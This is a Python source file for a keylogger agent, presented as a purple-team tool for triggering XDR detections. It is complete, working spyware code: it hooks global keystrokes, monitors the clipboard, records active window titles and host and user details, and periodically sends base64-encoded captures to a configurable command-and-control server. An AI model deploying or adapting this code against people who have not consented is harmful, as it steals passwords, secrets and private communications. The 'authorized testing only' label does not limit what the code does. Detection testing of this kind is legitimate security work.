#!/usr/bin/env python3
"""
Purple Team API Keylogger - Agent
==================================
MITRE ATT&CK: T1056.001 (Input Capture: Keylogging)
                T1115     (Clipboard Data)
                T1041     (Exfiltration Over C2 Channel)
                T1059.006 (Command and Scripting Interpreter: Python)

Captures keystrokes and sends them to the collection server via HTTP API.
Designed to trigger XDR detections for purple team exercises.

XDR detections this should trigger:
  - Process hooking keyboard input (CGEventTap on macOS, /dev/input on Linux)
  - Periodic HTTP POST beacons to external server
  - Base64-encoded payloads in HTTP body
  - Clipboard monitoring
  - Persistence via LaunchAgent / cron (if deployed)

macOS: Requires Accessibility permissions (System Settings > Privacy > Accessibility)
Linux: May require root or input group membership
"""

import os
import sys
import time
import json
import uuid
import base64
import socket
import signal
import platform
import threading
import urllib.request
import urllib.error
from datetime import datetime, timezone

# ── Config ──────────────────────────────────────────────────────────
C2_URL = os.getenv("KL_C2_URL", "http://127.0.0.1:8443")
AUTH_TOKEN = os.getenv("KL_AUTH_TOKEN", "purpleteam-xdr-test-2024")
EXFIL_INTERVAL = int(os.getenv("KL_INTERVAL", "15"))
CLIPBOARD_POLL = int(os.getenv("KL_CLIP_POLL", "5"))
AGENT_ID = os.getenv("KL_AGENT_ID", f"{socket.gethostname()}-{uuid.uuid4().hex[:8]}")

keystroke_buffer = []
buffer_lock = threading.Lock()
running = True


def log(msg: str):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ── API Client ──────────────────────────────────────────────────────
def api_post(endpoint: str, payload: dict) -> dict | None:
    url = f"{C2_URL}{endpoint}"
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "Content-Type": "application/json",
            "X-Auth-Token": AUTH_TOKEN,
            "User-Agent": "Mozilla/5.0 (compatible; PurpleTeamAgent/1.0)",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read())
    except urllib.error.URLError as e:
        log(f"  [!] API error: {e}")
        return None
    except Exception as e:
        log(f"  [!] Unexpected error: {e}")
        return None


def heartbeat():
    while running:
        api_post("/api/heartbeat", {
            "agent_id": AGENT_ID,
            "hostname": socket.gethostname(),
            "pid": os.getpid(),
            "platform": platform.system(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        })
        time.sleep(30)


# ── Keystroke Capture ───────────────────────────────────────────────
def get_active_window() -> str:
    """Best-effort active window title for context."""
    system = platform.system()
    try:
        if system == "Darwin":
            import subprocess
            script = '''
            tell application "System Events"
                set frontApp to name of first application process whose frontmost is true
            end tell
            '''
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=3
            )
            return result.stdout.strip() or "Unknown"
        elif system == "Linux":
            import subprocess
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=3
            )
            return result.stdout.strip() or "Unknown"
    except Exception:
        pass
    return "Unknown"


def on_key_press(key):
    try:
        char = key.char if hasattr(key, "char") and key.char else f"[{key}]"
    except AttributeError:
        char = f"[{key}]"

    with buffer_lock:
        keystroke_buffer.append(char)


def start_keylogger():
    try:
        from pynput.keyboard import Listener
    except ImportError:
        log("[!] pynput not installed. Run: pip install pynput")
        log("[!] Falling back to stdin capture mode (limited).")
        start_stdin_fallback()
        return

    log("[*] Starting keyboard listener (pynput)...")
    log("[*] On macOS, grant Accessibility access if prompted.")
    with Listener(on_press=on_key_press) as listener:
        listener.join()


def start_stdin_fallback():
    """Fallback: captures from stdin for demo/testing without pynput."""
    log("[*] Stdin fallback mode - type here to simulate keystrokes.")
    import select
    while running:
        if select.select([sys.stdin], [], [], 1.0)[0]:
            line = sys.stdin.readline()
            if not line:
                break
            with buffer_lock:
                keystroke_buffer.extend(list(line))


# ── Clipboard Capture ──────────────────────────────────────────────
def clipboard_monitor():
    """Poll clipboard for changes and exfiltrate new content."""
    last_clip = ""
    while running:
        try:
            current = get_clipboard()
            if current and current != last_clip:
                last_clip = current
                encoded = base64.b64encode(current.encode()).decode()
                log(f"[*] Clipboard change detected ({len(current)} chars)")
                api_post("/api/clipboard", {
                    "agent_id": AGENT_ID,
                    "content": encoded,
                    "encoding": "base64",
                })
        except Exception:
            pass
        time.sleep(CLIPBOARD_POLL)


def get_clipboard() -> str:
    system = platform.system()
    try:
        if system == "Darwin":
            import subprocess
            result = subprocess.run(
                ["pbpaste"], capture_output=True, text=True, timeout=3
            )
            return result.stdout
        elif system == "Linux":
            import subprocess
            result = subprocess.run(
                ["xclip", "-selection", "clipboard", "-o"],
                capture_output=True, text=True, timeout=3
            )
            return result.stdout
    except Exception:
        pass
    return ""


# ── Exfiltration Loop ──────────────────────────────────────────────
def exfil_loop():
    """Periodically flush the keystroke buffer to the C2 server."""
    while running:
        time.sleep(EXFIL_INTERVAL)

        with buffer_lock:
            if not keystroke_buffer:
                continue
            captured = "".join(keystroke_buffer)
            keystroke_buffer.clear()

        window = get_active_window()
        encoded = base64.b64encode(captured.encode()).decode()

        log(f"[*] Exfiltrating {len(captured)} keystrokes (window: {window})")
        result = api_post("/api/keystrokes", {
            "agent_id": AGENT_ID,
            "keystrokes": encoded,
            "encoding": "base64",
            "window_title": window,
            "count": len(captured),
        })
        if result:
            log(f"  [+] Server acknowledged: {result.get('count', '?')} keys")


# ── Main ────────────────────────────────────────────────────────────
def shutdown(signum, frame):
    global running
    log("[*] Shutting down agent...")
    running = False
    sys.exit(0)


def main():
    banner = f"""
╔══════════════════════════════════════════════════════════════╗
║  PURPLE TEAM - API Keylogger Agent                           ║
║  MITRE ATT&CK: T1056.001 / T1115 / T1041                    ║
║  FOR AUTHORIZED SECURITY TESTING ONLY                        ║
╠══════════════════════════════════════════════════════════════╣
║  Agent ID : {AGENT_ID:<46}║
║  C2 Server: {C2_URL:<46}║
║  Exfil Int: {EXFIL_INTERVAL}s{' ' * (44 - len(str(EXFIL_INTERVAL)))}║
║  Platform : {platform.system():<46}║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    # Heartbeat thread
    hb = threading.Thread(target=heartbeat, daemon=True)
    hb.start()

    # Exfiltration thread
    exfil = threading.Thread(target=exfil_loop, daemon=True)
    exfil.start()

    # Clipboard monitor thread
    clip = threading.Thread(target=clipboard_monitor, daemon=True)
    clip.start()

    log("[*] Agent started. Press Ctrl+C to stop.")

    # Keylogger runs on main thread (pynput requires it on macOS)
    start_keylogger()


if __name__ == "__main__":
    main()
